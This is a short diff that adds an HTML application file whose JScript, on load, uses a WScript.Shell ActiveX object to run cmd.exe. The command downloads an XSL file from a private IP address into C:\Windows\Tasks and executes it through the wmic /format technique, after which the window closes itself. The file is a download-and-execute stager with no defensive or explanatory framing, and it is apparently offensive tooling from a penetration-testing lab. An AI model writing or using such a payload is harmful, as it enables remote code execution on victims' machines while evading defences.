@@ -1,0 +1,14 @@
+<html> 
+<head> 
+<script language="JScript">
+
+        var shell = new ActiveXObject("WScript.Shell");
+        var amit = shell.Run('cmd.exe /c curl http://192.168.45.223/test.xsl -o C:\\Windows\\Tasks\\test.xsl && wmic process get /format:"C:\\Windows\\Tasks\\test.xsl"');
+</script>
+</head> 
+<body>
+<script language="JScript">
+self.close();
+</script>
+</body> 
+</html>
